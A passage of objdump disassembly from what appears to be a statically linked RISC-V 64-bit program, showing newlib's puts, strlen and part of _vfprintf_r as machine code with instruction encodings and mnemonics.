   107e6:	680c                	ld	a1,16(s0)
   107e8:	cf8d                	beqz	a5,10822 <_puts_r+0x70>
   107ea:	01059783          	lh	a5,16(a1) # 4010 <register_fini-0xc0a0>
   107ee:	03279713          	slli	a4,a5,0x32
   107f2:	00074d63          	bltz	a4,1080c <_puts_r+0x5a>
   107f6:	0ac5a703          	lw	a4,172(a1)
   107fa:	6689                	lui	a3,0x2
   107fc:	8fd5                	or	a5,a5,a3
   107fe:	76f9                	lui	a3,0xffffe
   10800:	16fd                	addi	a3,a3,-1
   10802:	8f75                	and	a4,a4,a3
   10804:	00f59823          	sh	a5,16(a1)
   10808:	0ae5a623          	sw	a4,172(a1)
   1080c:	0830                	addi	a2,sp,24
   1080e:	8522                	mv	a0,s0
   10810:	6dc020ef          	jal	ra,12eec <__sfvwrite_r>
   10814:	ed09                	bnez	a0,1082e <_puts_r+0x7c>
   10816:	4529                	li	a0,10
   10818:	70a6                	ld	ra,104(sp)
   1081a:	7406                	ld	s0,96(sp)
   1081c:	64e6                	ld	s1,88(sp)
   1081e:	6165                	addi	sp,sp,112
   10820:	8082                	ret
   10822:	8522                	mv	a0,s0
   10824:	e42e                	sd	a1,8(sp)
   10826:	344020ef          	jal	ra,12b6a <__sinit>
   1082a:	65a2                	ld	a1,8(sp)
   1082c:	bf7d                	j	107ea <_puts_r+0x38>
   1082e:	557d                	li	a0,-1
   10830:	b7e5                	j	10818 <_puts_r+0x66>

0000000000010832 <puts>:
   10832:	85aa                	mv	a1,a0
   10834:	8601b503          	ld	a0,-1952(gp) # 1f558 <_impure_ptr>
   10838:	bfad                	j	107b2 <_puts_r>

000000000001083a <strlen>:
   1083a:	00757793          	andi	a5,a0,7
   1083e:	872a                	mv	a4,a0
   10840:	ebb9                	bnez	a5,10896 <strlen+0x5c>
   10842:	0000f697          	auipc	a3,0xf
   10846:	cb66b683          	ld	a3,-842(a3) # 1f4f8 <__SDATA_BEGIN__>
   1084a:	55fd                	li	a1,-1
   1084c:	6310                	ld	a2,0(a4)
   1084e:	0721                	addi	a4,a4,8
   10850:	00d677b3          	and	a5,a2,a3
   10854:	97b6                	add	a5,a5,a3
   10856:	8fd1                	or	a5,a5,a2
   10858:	8fd5                	or	a5,a5,a3
   1085a:	feb789e3          	beq	a5,a1,1084c <strlen+0x12>
   1085e:	ff874683          	lbu	a3,-8(a4)
   10862:	40a707b3          	sub	a5,a4,a0
   10866:	c6a9                	beqz	a3,108b0 <strlen+0x76>
   10868:	ff974683          	lbu	a3,-7(a4)
   1086c:	ce9d                	beqz	a3,108aa <strlen+0x70>
   1086e:	ffa74683          	lbu	a3,-6(a4)
   10872:	c6a9                	beqz	a3,108bc <strlen+0x82>
   10874:	ffb74683          	lbu	a3,-5(a4)
   10878:	ce9d                	beqz	a3,108b6 <strlen+0x7c>
   1087a:	ffc74683          	lbu	a3,-4(a4)
   1087e:	ffd74603          	lbu	a2,-3(a4)
   10882:	ffe74503          	lbu	a0,-2(a4)
   10886:	ce95                	beqz	a3,108c2 <strlen+0x88>
   10888:	c221                	beqz	a2,108c8 <strlen+0x8e>
   1088a:	00a03533          	snez	a0,a0
   1088e:	953e                	add	a0,a0,a5
   10890:	1579                	addi	a0,a0,-2
   10892:	8082                	ret
   10894:	d6dd                	beqz	a3,10842 <strlen+0x8>
   10896:	00074783          	lbu	a5,0(a4)
   1089a:	0705                	addi	a4,a4,1
   1089c:	00777693          	andi	a3,a4,7
   108a0:	fbf5                	bnez	a5,10894 <strlen+0x5a>
   108a2:	8f09                	sub	a4,a4,a0
   108a4:	fff70513          	addi	a0,a4,-1
   108a8:	8082                	ret
   108aa:	ff978513          	addi	a0,a5,-7
   108ae:	8082                	ret
   108b0:	ff878513          	addi	a0,a5,-8
   108b4:	8082                	ret
   108b6:	ffb78513          	addi	a0,a5,-5
   108ba:	8082                	ret
   108bc:	ffa78513          	addi	a0,a5,-6
   108c0:	8082                	ret
   108c2:	ffc78513          	addi	a0,a5,-4
   108c6:	8082                	ret
   108c8:	ffd78513          	addi	a0,a5,-3
   108cc:	8082                	ret

00000000000108ce <_vfprintf_r>:
   108ce:	d8010113          	addi	sp,sp,-640
   108d2:	26113c23          	sd	ra,632(sp)
   108d6:	25413823          	sd	s4,592(sp)
   108da:	25513423          	sd	s5,584(sp)
   108de:	23913423          	sd	s9,552(sp)
   108e2:	8a2e                	mv	s4,a1
   108e4:	8cb2                	mv	s9,a2
   108e6:	e836                	sd	a3,16(sp)
   108e8:	26813823          	sd	s0,624(sp)
   108ec:	26913423          	sd	s1,616(sp)
   108f0:	27213023          	sd	s2,608(sp)
   108f4:	25313c23          	sd	s3,600(sp)
   108f8:	25613023          	sd	s6,576(sp)
   108fc:	23713c23          	sd	s7,568(sp)
   10900:	23813823          	sd	s8,560(sp)
   10904:	23a13023          	sd	s10,544(sp)
   10908:	21b13c23          	sd	s11,536(sp)
   1090c:	8aaa                	mv	s5,a0
   1090e:	2c5040ef          	jal	ra,153d2 <_localeconv_r>
   10912:	611c                	ld	a5,0(a0)
   10914:	853e                	mv	a0,a5
   10916:	fcbe                	sd	a5,120(sp)
   10918:	f23ff0ef          	jal	ra,1083a <strlen>
   1091c:	f8aa                	sd	a0,112(sp)
   1091e:	e202                	sd	zero,256(sp)
   10920:	e602                	sd	zero,264(sp)
   10922:	000a8663          	beqz	s5,1092e <_vfprintf_r+0x60>
   10926:	050aa783          	lw	a5,80(s5)
   1092a:	70078063          	beqz	a5,1102a <_vfprintf_r+0x75c>
   1092e:	010a1703          	lh	a4,16(s4)
   10932:	03071793          	slli	a5,a4,0x30
   10936:	03271693          	slli	a3,a4,0x32
   1093a:	93c1                	srli	a5,a5,0x30
   1093c:	0006cf63          	bltz	a3,1095a <_vfprintf_r+0x8c>
   10940:	0aca2683          	lw	a3,172(s4)
   10944:	6789                	lui	a5,0x2
   10946:	8fd9                	or	a5,a5,a4
   10948:	7779                	lui	a4,0xffffe
   1094a:	177d                	addi	a4,a4,-1
   1094c:	8f75                	and	a4,a4,a3
   1094e:	00fa1823          	sh	a5,16(s4)
   10952:	17c2                	slli	a5,a5,0x30
   10954:	0aea2623          	sw	a4,172(s4)
   10958:	93c1                	srli	a5,a5,0x30
   1095a:	0087f713          	andi	a4,a5,8
   1095e:	26070463          	beqz	a4,10bc6 <_vfprintf_r+0x2f8>
   10962:	018a3703          	ld	a4,24(s4)
   10966:	26070063          	beqz	a4,10bc6 <_vfprintf_r+0x2f8>
   1096a:	8be9                	andi	a5,a5,26
   1096c:	4729                	li	a4,10
   1096e:	26e78963          	beq	a5,a4,10be0 <_vfprintf_r+0x312>
   10972:	000cc783          	lbu	a5,0(s9)
   10976:	19010b93          	addi	s7,sp,400
   1097a:	ea5e                	sd	s7,272(sp)
   1097c:	f202                	sd	zero,288(sp)
   1097e:	10012c23          	sw	zero,280(sp)
   10982:	f002                	sd	zero,32(sp)
   10984:	f402                	sd	zero,40(sp)
   10986:	e102                	sd	zero,128(sp)
   10988:	f482                	sd	zero,104(sp)
   1098a:	e502                	sd	zero,136(sp)
   1098c:	e902                	sd	zero,144(sp)
   1098e:	e002                	sd	zero,0(sp)
   10990:	835e                	mv	t1,s7
   10992:	4d41                	li	s10,16
   10994:	0000c917          	auipc	s2,0xc
   10998:	e8c90913          	addi	s2,s2,-372 # 1c820 <zeroes.4521>
   1099c:	1c078663          	beqz	a5,10b68 <_vfprintf_r+0x29a>
   109a0:	8466                	mv	s0,s9
   109a2:	02500713          	li	a4,37
   109a6:	30e78463          	beq	a5,a4,10cae <_vfprintf_r+0x3e0>
   109aa:	00144783          	lbu	a5,1(s0)
   109ae:	0405                	addi	s0,s0,1
   109b0:	fbfd                	bnez	a5,109a6 <_vfprintf_r+0xd8>
   109b2:	419404bb          	subw	s1,s0,s9
   109b6:	1a048963          	beqz	s1,10b68 <_vfprintf_r+0x29a>
   109ba:	7712                	ld	a4,288(sp)
   109bc:	11812783          	lw	a5,280(sp)
   109c0:	01933023          	sd	s9,0(t1)
   109c4:	9726                	add	a4,a4,s1
   109c6:	2785                	addiw	a5,a5,1
   109c8:	00933423          	sd	s1,8(t1)
   109cc:	f23a                	sd	a4,288(sp)
   109ce:	10f12c23          	sw	a5,280(sp)
   109d2:	0007871b          	sext.w	a4,a5
   109d6:	479d                	li	a5,7
   109d8:	0341                	addi	t1,t1,16
   109da:	2ee7c163          	blt	a5,a4,10cbc <_vfprintf_r+0x3ee>
   109de:	6702                	ld	a4,0(sp)
   109e0:	00044783          	lbu	a5,0(s0)
   109e4:	9f25                	addw	a4,a4,s1
   109e6:	e03a                	sd	a4,0(sp)
   109e8:	18078063          	beqz	a5,10b68 <_vfprintf_r+0x29a>
   109ec:	00144f03          	lbu	t5,1(s0)
   109f0:	0c010fa3          	sb	zero,223(sp)
   109f4:	0405                	addi	s0,s0,1
   109f6:	5efd                	li	t4,-1
   109f8:	4b01                	li	s6,0
   109fa:	4481                	li	s1,0
   109fc:	49a5                	li	s3,9
   109fe:	02a00c13          	li	s8,42
   10a02:	0405                	addi	s0,s0,1
   10a04:	000f0d9b          	sext.w	s11,t5
   10a08:	05a00693          	li	a3,90
   10a0c:	fe0d879b          	addiw	a5,s11,-32
   10a10:	0007871b          	sext.w	a4,a5
   10a14:	04e6e663          	bltu	a3,a4,10a60 <_vfprintf_r+0x192>
   10a18:	1782                	slli	a5,a5,0x20
   10a1a:	0000c717          	auipc	a4,0xc
   10a1e:	c8670713          	addi	a4,a4,-890 # 1c6a0 <__clzdi2+0x1c6>
   10a22:	83f9                	srli	a5,a5,0x1e
   10a24:	97ba                	add	a5,a5,a4
   10a26:	439c                	lw	a5,0(a5)
   10a28:	97ba                	add	a5,a5,a4
   10a2a:	8782                	jr	a5
   10a2c:	4b01                	li	s6,0
   10a2e:	00044703          	lbu	a4,0(s0)
   10a32:	002b179b          	slliw	a5,s6,0x2
   10a36:	01678b3b          	addw	s6,a5,s6
   10a3a:	fd0d8f1b          	addiw	t5,s11,-48
   10a3e:	001b1b1b          	slliw	s6,s6,0x1
   10a42:	fd07079b          	addiw	a5,a4,-48
   10a46:	0405                	addi	s0,s0,1
   10a48:	016f0b3b          	addw	s6,t5,s6
   10a4c:	00070d9b          	sext.w	s11,a4
   10a50:	fcf9ffe3          	bgeu	s3,a5,10a2e <_vfprintf_r+0x160>
   10a54:	fe0d879b          	addiw	a5,s11,-32
   10a58:	0007871b          	sext.w	a4,a5
   10a5c:	fae6fee3          	bgeu	a3,a4,10a18 <_vfprintf_r+0x14a>
   10a60:	100d8463          	beqz	s11,10b68 <_vfprintf_r+0x29a>
   10a64:	13b10423          	sb	s11,296(sp)
   10a68:	0c010fa3          	sb	zero,223(sp)
   10a6c:	4985                	li	s3,1
   10a6e:	4c05                	li	s8,1
   10a70:	12810c93          	addi	s9,sp,296
   10a74:	ec02                	sd	zero,24(sp)
   10a76:	4e81                	li	t4,0
   10a78:	e882                	sd	zero,80(sp)
   10a7a:	f082                	sd	zero,96(sp)
   10a7c:	ec82                	sd	zero,88(sp)
   10a7e:	0024f793          	andi	a5,s1,2
   10a82:	0007829b          	sext.w	t0,a5
   10a86:	c391                	beqz	a5,10a8a <_vfprintf_r+0x1bc>
   10a88:	2989                	addiw	s3,s3,2
   10a8a:	0844ff93          	andi	t6,s1,132
   10a8e:	7792                	ld	a5,288(sp)
   10a90:	000f9663          	bnez	t6,10a9c <_vfprintf_r+0x1ce>
   10a94:	413b06bb          	subw	a3,s6,s3
   10a98:	2cd046e3          	bgtz	a3,11564 <_vfprintf_r+0xc96>
   10a9c:	0df14703          	lbu	a4,223(sp)
   10aa0:	c70d                	beqz	a4,10aca <_vfprintf_r+0x1fc>
   10aa2:	11812703          	lw	a4,280(sp)
   10aa6:	0df10693          	addi	a3,sp,223
   10aaa:	00d33023          	sd	a3,0(t1)
   10aae:	2705                	addiw	a4,a4,1
   10ab0:	4685                	li	a3,1
   10ab2:	0785                	addi	a5,a5,1
   10ab4:	00d33423          	sd	a3,8(t1)
   10ab8:	10e12c23          	sw	a4,280(sp)
   10abc:	0007069b          	sext.w	a3,a4
   10ac0:	f23e                	sd	a5,288(sp)
   10ac2:	471d                	li	a4,7
   10ac4:	0341                	addi	t1,t1,16
   10ac6:	42d74863          	blt	a4,a3,10ef6 <_vfprintf_r+0x628>
   10aca:	02028563          	beqz	t0,10af4 <_vfprintf_r+0x226>
   10ace:	11812703          	lw	a4,280(sp)
   10ad2:	1194                	addi	a3,sp,224
   10ad4:	00d33023          	sd	a3,0(t1)
   10ad8:	2705                	addiw	a4,a4,1
   10ada:	4689                	li	a3,2
   10adc:	0789                	addi	a5,a5,2
   10ade:	00d33423          	sd	a3,8(t1)
   10ae2:	10e12c23          	sw	a4,280(sp)
   10ae6:	0007069b          	sext.w	a3,a4
   10aea:	f23e                	sd	a5,288(sp)
   10aec:	471d                	li	a4,7
   10aee:	0341                	addi	t1,t1,16
   10af0:	30d74ce3          	blt	a4,a3,11608 <_vfprintf_r+0xd3a>
   10af4:	08000713          	li	a4,128
   10af8:	06ef81e3          	beq	t6,a4,1135a <_vfprintf_r+0xa8c>
   10afc:	418e8ebb          	subw	t4,t4,s8
   10b00:	0fd043e3          	bgtz	t4,113e6 <_vfprintf_r+0xb18>
   10b04:	1004f713          	andi	a4,s1,256
   10b08:	78071663          	bnez	a4,11294 <_vfprintf_r+0x9c6>
   10b0c:	11812703          	lw	a4,280(sp)
   10b10:	97e2                	add	a5,a5,s8
   10b12:	01933023          	sd	s9,0(t1)
   10b16:	0017069b          	addiw	a3,a4,1
   10b1a:	8736                	mv	a4,a3
   10b1c:	01833423          	sd	s8,8(t1)
   10b20:	10e12c23          	sw	a4,280(sp)
   10b24:	f23e                	sd	a5,288(sp)
   10b26:	471d                	li	a4,7
   10b28:	44d74963          	blt	a4,a3,10f7a <_vfprintf_r+0x6ac>
   10b2c:	0341                	addi	t1,t1,16
   10b2e:	8891                	andi	s1,s1,4
   10b30:	c489                	beqz	s1,10b3a <_vfprintf_r+0x26c>
   10b32:	413b04bb          	subw	s1,s6,s3
   10b36:	2e9048e3          	bgtz	s1,11626 <_vfprintf_r+0xd58>
   10b3a:	875a                	mv	a4,s6
   10b3c:	013b5363          	bge	s6,s3,10b42 <_vfprintf_r+0x274>
   10b40:	874e                	mv	a4,s3
   10b42:	6682                	ld	a3,0(sp)
   10b44:	9f35                	addw	a4,a4,a3
   10b46:	e03a                	sd	a4,0(sp)
   10b48:	10079ce3          	bnez	a5,11460 <_vfprintf_r+0xb92>
   10b4c:	67e2                	ld	a5,24(sp)
   10b4e:	10012c23          	sw	zero,280(sp)
   10b52:	c789                	beqz	a5,10b5c <_vfprintf_r+0x28e>
   10b54:	65e2                	ld	a1,24(sp)
   10b56:	8556                	mv	a0,s5
   10b58:	144020ef          	jal	ra,12c9c <_free_r>
   10b5c:	835e                	mv	t1,s7
   10b5e:	8ca2                	mv	s9,s0
   10b60:	000cc783          	lbu	a5,0(s9)
   10b64:	e2079ee3          	bnez	a5,109a0 <_vfprintf_r+0xd2>
   10b68:	7792                	ld	a5,288(sp)
   10b6a:	c399                	beqz	a5,10b70 <_vfprintf_r+0x2a2>
   10b6c:	2de0106f          	j	11e4a <_vfprintf_r+0x157c>
   10b70:	010a5783          	lhu	a5,16(s4)
   10b74:	0407f793          	andi	a5,a5,64
   10b78:	c399                	beqz	a5,10b7e <_vfprintf_r+0x2b0>
   10b7a:	67c0106f          	j	121f6 <_vfprintf_r+0x1928>
   10b7e:	27813083          	ld	ra,632(sp)
   10b82:	27013403          	ld	s0,624(sp)
   10b86:	6502                	ld	a0,0(sp)
   10b88:	26813483          	ld	s1,616(sp)
   10b8c:	26013903          	ld	s2,608(sp)
   10b90:	25813983          	ld	s3,600(sp)
   10b94:	25013a03          	ld	s4,592(sp)
   10b98:	24813a83          	ld	s5,584(sp)
   10b9c:	24013b03          	ld	s6,576(sp)
   10ba0:	23813b83          	ld	s7,568(sp)
   10ba4:	23013c03          	ld	s8,560(sp)
   10ba8:	22813c83          	ld	s9,552(sp)
   10bac:	22013d03          	ld	s10,544(sp)
   10bb0:	21813d83          	ld	s11,536(sp)
   10bb4:	28010113          	addi	sp,sp,640
   10bb8:	8082                	ret
   10bba:	0104e493          	ori	s1,s1,16
   10bbe:	00044f03          	lbu	t5,0(s0)
   10bc2:	2481                	sext.w	s1,s1
   10bc4:	bd3d                	j	10a02 <_vfprintf_r+0x134>
   10bc6:	85d2                	mv	a1,s4
   10bc8:	8556                	mv	a0,s5
   10bca:	1c1010ef          	jal	ra,1258a <__swsetup_r>
   10bce:	c119                	beqz	a0,10bd4 <_vfprintf_r+0x306>
   10bd0:	6260106f          	j	121f6 <_vfprintf_r+0x1928>
   10bd4:	010a5783          	lhu	a5,16(s4)
   10bd8:	4729                	li	a4,10
   10bda:	8be9                	andi	a5,a5,26
   10bdc:	d8e79be3          	bne	a5,a4,10972 <_vfprintf_r+0xa4>
   10be0:	012a1783          	lh	a5,18(s4)
   10be4:	d807c7e3          	bltz	a5,10972 <_vfprintf_r+0xa4>
   10be8:	66c2                	ld	a3,16(sp)
   10bea:	8666                	mv	a2,s9
   10bec:	85d2                	mv	a1,s4
   10bee:	8556                	mv	a0,s5
   10bf0:	107010ef          	jal	ra,124f6 <__sbprintf>
   10bf4:	e02a                	sd	a0,0(sp)
   10bf6:	b761                	j	10b7e <_vfprintf_r+0x2b0>
   10bf8:	0104e493          	ori	s1,s1,16
   10bfc:	2481                	sext.w	s1,s1
   10bfe:	66c2                	ld	a3,16(sp)
   10c00:	0204f793          	andi	a5,s1,32
   10c04:	00868713          	addi	a4,a3,8
   10c08:	3a078263          	beqz	a5,10fac <_vfprintf_r+0x6de>
   10c0c:	629c                	ld	a5,0(a3)
   10c0e:	89be                	mv	s3,a5
   10c10:	3a07cc63          	bltz	a5,10fc8 <_vfprintf_r+0x6fa>
   10c14:	57fd                	li	a5,-1
   10c16:	48fe87e3          	beq	t4,a5,118a4 <_vfprintf_r+0xfd6>
   10c1a:	f7f4f493          	andi	s1,s1,-129
   10c1e:	e83a                	sd	a4,16(sp)
   10c20:	0004881b          	sext.w	a6,s1
   10c24:	120993e3          	bnez	s3,1154a <_vfprintf_r+0xc7c>
   10c28:	120e94e3          	bnez	t4,11550 <_vfprintf_r+0xc82>
   10c2c:	84c2                	mv	s1,a6
   10c2e:	4e81                	li	t4,0
   10c30:	4c01                	li	s8,0
   10c32:	18c10c93          	addi	s9,sp,396
   10c36:	000c099b          	sext.w	s3,s8
   10c3a:	01dc5463          	bge	s8,t4,10c42 <_vfprintf_r+0x374>
   10c3e:	000e899b          	sext.w	s3,t4
   10c42:	0df14783          	lbu	a5,223(sp)
   10c46:	ec02                	sd	zero,24(sp)
   10c48:	e882                	sd	zero,80(sp)
   10c4a:	f082                	sd	zero,96(sp)
   10c4c:	ec82                	sd	zero,88(sp)
   10c4e:	e20788e3          	beqz	a5,10a7e <_vfprintf_r+0x1b0>
   10c52:	2985                	addiw	s3,s3,1
   10c54:	b52d                	j	10a7e <_vfprintf_r+0x1b0>
   10c56:	0104e493          	ori	s1,s1,16
   10c5a:	2481                	sext.w	s1,s1
   10c5c:	66c2                	ld	a3,16(sp)
   10c5e:	0204f793          	andi	a5,s1,32
   10c62:	00868713          	addi	a4,a3,8
   10c66:	32078463          	beqz	a5,10f8e <_vfprintf_r+0x6c0>
   10c6a:	0006b983          	ld	s3,0(a3)
   10c6e:	bff4f493          	andi	s1,s1,-1025
   10c72:	0004881b          	sext.w	a6,s1
   10c76:	e83a                	sd	a4,16(sp)
   10c78:	4781                	li	a5,0
   10c7a:	0c010fa3          	sb	zero,223(sp)
   10c7e:	577d                	li	a4,-1
   10c80:	36ee8063          	beq	t4,a4,10fe0 <_vfprintf_r+0x712>
   10c84:	f7f87493          	andi	s1,a6,-129
   10c88:	2481                	sext.w	s1,s1
   10c8a:	0a099ce3          	bnez	s3,11542 <_vfprintf_r+0xc74>
   10c8e:	5c0e9663          	bnez	t4,1125a <_vfprintf_r+0x98c>
   10c92:	ffd1                	bnez	a5,10c2e <_vfprintf_r+0x360>
   10c94:	00187c13          	andi	s8,a6,1
   10c98:	18c10c93          	addi	s9,sp,396
   10c9c:	f80c0de3          	beqz	s8,10c36 <_vfprintf_r+0x368>
   10ca0:	03000793          	li	a5,48
   10ca4:	18f105a3          	sb	a5,395(sp)
   10ca8:	18b10c93          	addi	s9,sp,395
   10cac:	b769                	j	10c36 <_vfprintf_r+0x368>
   10cae:	419404bb          	subw	s1,s0,s9
   10cb2:	d00494e3          	bnez	s1,109ba <_vfprintf_r+0xec>
   10cb6:	00044783          	lbu	a5,0(s0)
   10cba:	b33d                	j	109e8 <_vfprintf_r+0x11a>
   10cbc:	0a10                	addi	a2,sp,272
   10cbe:	85d2                	mv	a1,s4
   10cc0:	8556                	mv	a0,s5
   10cc2:	1ca080ef          	jal	ra,18e8c <__sprint_r>
   10cc6:	ea0515e3          	bnez	a0,10b70 <_vfprintf_r+0x2a2>
   10cca:	835e                	mv	t1,s7
   10ccc:	bb09                	j	109de <_vfprintf_r+0x110>
   10cce:	0084f793          	andi	a5,s1,8
   10cd2:	3a079ee3          	bnez	a5,1188e <_vfprintf_r+0xfc0>
   10cd6:	67c2                	ld	a5,16(sp)
   10cd8:	ec1a                	sd	t1,24(sp)
   10cda:	e476                	sd	t4,8(sp)
   10cdc:	2388                	fld	fa0,0(a5)
   10cde:	00878693          	addi	a3,a5,8 # 2008 <register_fini-0xe0a8>
   10ce2:	e836                	sd	a3,16(sp)
   10ce4:	5040b0ef          	jal	ra,1c1e8 <__extenddftf2>
   10ce8:	6362                	ld	t1,24(sp)
   10cea:	6ea2                	ld	t4,8(sp)
   10cec:	e22a                	sd	a0,256(sp)
   10cee:	e62e                	sd	a1,264(sp)
   10cf0:	0208                	addi	a0,sp,256
   10cf2:	ec1a                	sd	t1,24(sp)
   10cf4:	e476                	sd	t4,8(sp)
   10cf6:	6a0040ef          	jal	ra,15396 <_ldcheck>
   10cfa:	d5aa                	sw	a0,232(sp)
   10cfc:	4789                	li	a5,2
   10cfe:	6ea2                	ld	t4,8(sp)
   10d00:	6362                	ld	t1,24(sp)
   10d02:	64f502e3          	beq	a0,a5,11b46 <_vfprintf_r+0x1278>
   10d06:	4785                	li	a5,1
   10d08:	6ef50ee3          	beq	a0,a5,11c04 <_vfprintf_r+0x1336>
   10d0c:	06100793          	li	a5,97
   10d10:	00fd9463          	bne	s11,a5,10d18 <_vfprintf_r+0x44a>
   10d14:	5740106f          	j	12288 <_vfprintf_r+0x19ba>
   10d18:	04100793          	li	a5,65
   10d1c:	00fd9463          	bne	s11,a5,10d24 <_vfprintf_r+0x456>
   10d20:	1380106f          	j	11e58 <_vfprintf_r+0x158a>
   10d24:	fdfdf713          	andi	a4,s11,-33
   10d28:	57fd                	li	a5,-1
   10d2a:	f0ba                	sd	a4,96(sp)
   10d2c:	00fe9463          	bne	t4,a5,10d34 <_vfprintf_r+0x466>
   10d30:	6140106f          	j	12344 <_vfprintf_r+0x1a76>
   10d34:	04700793          	li	a5,71
   10d38:	00f71463          	bne	a4,a5,10d40 <_vfprintf_r+0x472>
   10d3c:	5c40106f          	j	12300 <_vfprintf_r+0x1a32>
   10d40:	69b2                	ld	s3,264(sp)
   10d42:	1004e793          	ori	a5,s1,256
   10d46:	ed26                	sd	s1,152(sp)
   10d48:	6c12                	ld	s8,256(sp)
   10d4a:	2781                	sext.w	a5,a5
   10d4c:	0009d463          	bgez	s3,10d54 <_vfprintf_r+0x486>
   10d50:	67a0106f          	j	123ca <_vfprintf_r+0x1afc>
   10d54:	e582                	sd	zero,200(sp)
   10d56:	84be                	mv	s1,a5
   10d58:	ec02                	sd	zero,24(sp)
   10d5a:	2701                	sext.w	a4,a4
   10d5c:	04600793          	li	a5,70
   10d60:	00f71463          	bne	a4,a5,10d68 <_vfprintf_r+0x49a>
   10d64:	38a0106f          	j	120ee <_vfprintf_r+0x1820>
   10d68:	7706                	ld	a4,96(sp)
   10d6a:	04500793          	li	a5,69
   10d6e:	00f70463          	beq	a4,a5,10d76 <_vfprintf_r+0x4a8>
   10d72:	33c0106f          	j	120ae <_vfprintf_r+0x17e0>
   10d76:	001e871b          	addiw	a4,t4,1
   10d7a:	0f810893          	addi	a7,sp,248
   10d7e:	0ec10813          	addi	a6,sp,236
   10d82:	11bc                	addi	a5,sp,232
   10d84:	4689                	li	a3,2
   10d86:	85e2                	mv	a1,s8
   10d88:	864e                	mv	a2,s3
   10d8a:	8556                	mv	a0,s5
   10d8c:	f81a                	sd	t1,48(sp)
   10d8e:	f076                	sd	t4,32(sp)
   10d90:	e43a                	sd	a4,8(sp)
   10d92:	78c030ef          	jal	ra,1451e <_ldtoa_r>
   10d96:	6722                	ld	a4,8(sp)
   10d98:	7e82                	ld	t4,32(sp)
   10d9a:	7342                	ld	t1,48(sp)
   10d9c:	8caa                	mv	s9,a0
   10d9e:	00e508b3          	add	a7,a0,a4
   10da2:	4601                	li	a2,0
   10da4:	4681                	li	a3,0
   10da6:	8562                	mv	a0,s8
   10da8:	85ce                	mv	a1,s3
   10daa:	f846                	sd	a7,48(sp)
   10dac:	f01a                	sd	t1,32(sp)
   10dae:	e476                	sd	t4,8(sp)
   10db0:	3540a0ef          	jal	ra,1b104 <__eqtf2>
   10db4:	78c2                	ld	a7,48(sp)
   10db6:	6ea2                	ld	t4,8(sp)
   10db8:	7302                	ld	t1,32(sp)
   10dba:	87c6                	mv	a5,a7
   10dbc:	cd11                	beqz	a0,10dd8 <_vfprintf_r+0x50a>
   10dbe:	77ee                	ld	a5,248(sp)
   10dc0:	0117fc63          	bgeu	a5,a7,10dd8 <_vfprintf_r+0x50a>
   10dc4:	03000693          	li	a3,48
   10dc8:	00178713          	addi	a4,a5,1
   10dcc:	fdba                	sd	a4,248(sp)
   10dce:	00d78023          	sb	a3,0(a5)
   10dd2:	77ee                	ld	a5,248(sp)
   10dd4:	ff17eae3          	bltu	a5,a7,10dc8 <_vfprintf_r+0x4fa>
   10dd8:	419787bb          	subw	a5,a5,s9
   10ddc:	f03e                	sd	a5,32(sp)
   10dde:	572e                	lw	a4,232(sp)
   10de0:	04700793          	li	a5,71
   10de4:	ecba                	sd	a4,88(sp)
   10de6:	7706                	ld	a4,96(sp)
   10de8:	00f71463          	bne	a4,a5,10df0 <_vfprintf_r+0x522>
   10dec:	2200106f          	j	1200c <_vfprintf_r+0x173e>
   10df0:	7706                	ld	a4,96(sp)
   10df2:	04600793          	li	a5,70
   10df6:	00f71463          	bne	a4,a5,10dfe <_vfprintf_r+0x530>
   10dfa:	3c40106f          	j	121be <_vfprintf_r+0x18f0>
   10dfe:	67e6                	ld	a5,88(sp)
   10e00:	7586                	ld	a1,96(sp)
   10e02:	04100613          	li	a2,65
   10e06:	37fd                	addiw	a5,a5,-1
   10e08:	d5be                	sw	a5,232(sp)
   10e0a:	0ffdf713          	andi	a4,s11,255
   10e0e:	4681                	li	a3,0
   10e10:	00c59663          	bne	a1,a2,10e1c <_vfprintf_r+0x54e>
   10e14:	273d                	addiw	a4,a4,15
   10e16:	0ff77713          	andi	a4,a4,255
   10e1a:	4685                	li	a3,1
   10e1c:	0ee10823          	sb	a4,240(sp)
   10e20:	02b00713          	li	a4,43
   10e24:	0007d763          	bgez	a5,10e32 <_vfprintf_r+0x564>
   10e28:	6766                	ld	a4,88(sp)
   10e2a:	4785                	li	a5,1
   10e2c:	9f99                	subw	a5,a5,a4
   10e2e:	02d00713          	li	a4,45
   10e32:	0ee108a3          	sb	a4,241(sp)
   10e36:	4725                	li	a4,9
   10e38:	00f74463          	blt	a4,a5,10e40 <_vfprintf_r+0x572>
   10e3c:	5e00106f          	j	1241c <_vfprintf_r+0x1b4e>
   10e40:	0ff10513          	addi	a0,sp,255
   10e44:	85aa                	mv	a1,a0
   10e46:	46a9                	li	a3,10
   10e48:	06300e93          	li	t4,99
   10e4c:	02d7e73b          	remw	a4,a5,a3
   10e50:	862e                	mv	a2,a1
   10e52:	88be                	mv	a7,a5
   10e54:	15fd                	addi	a1,a1,-1
   10e56:	0307071b          	addiw	a4,a4,48
   10e5a:	fee60fa3          	sb	a4,-1(a2)
   10e5e:	02d7c7bb          	divw	a5,a5,a3
   10e62:	ff1ec5e3          	blt	t4,a7,10e4c <_vfprintf_r+0x57e>
   10e66:	0307879b          	addiw	a5,a5,48
   10e6a:	0ff7f693          	andi	a3,a5,255
   10e6e:	fed58fa3          	sb	a3,-1(a1)
   10e72:	ffe60793          	addi	a5,a2,-2
   10e76:	00a7e463          	bltu	a5,a0,10e7e <_vfprintf_r+0x5b0>
   10e7a:	6560106f          	j	124d0 <_vfprintf_r+0x1c02>
   10e7e:	0f210713          	addi	a4,sp,242
   10e82:	a019                	j	10e88 <_vfprintf_r+0x5ba>
   10e84:	0007c683          	lbu	a3,0(a5)
   10e88:	00d70023          	sb	a3,0(a4)
   10e8c:	0785                	addi	a5,a5,1
   10e8e:	0705                	addi	a4,a4,1
   10e90:	fea79ae3          	bne	a5,a0,10e84 <_vfprintf_r+0x5b6>
   10e94:	10110793          	addi	a5,sp,257
   10e98:	0f210713          	addi	a4,sp,242
   10e9c:	8f91                	sub	a5,a5,a2
   10e9e:	97ba                	add	a5,a5,a4
   10ea0:	1998                	addi	a4,sp,240
   10ea2:	9f99                	subw	a5,a5,a4
   10ea4:	e13e                	sd	a5,128(sp)
   10ea6:	678a                	ld	a5,128(sp)
   10ea8:	7682                	ld	a3,32(sp)
   10eaa:	4705                	li	a4,1
   10eac:	00f68c3b          	addw	s8,a3,a5
   10eb0:	87e2                	mv	a5,s8
   10eb2:	00d74463          	blt	a4,a3,10eba <_vfprintf_r+0x5ec>
   10eb6:	5a00106f          	j	12456 <_vfprintf_r+0x1b88>
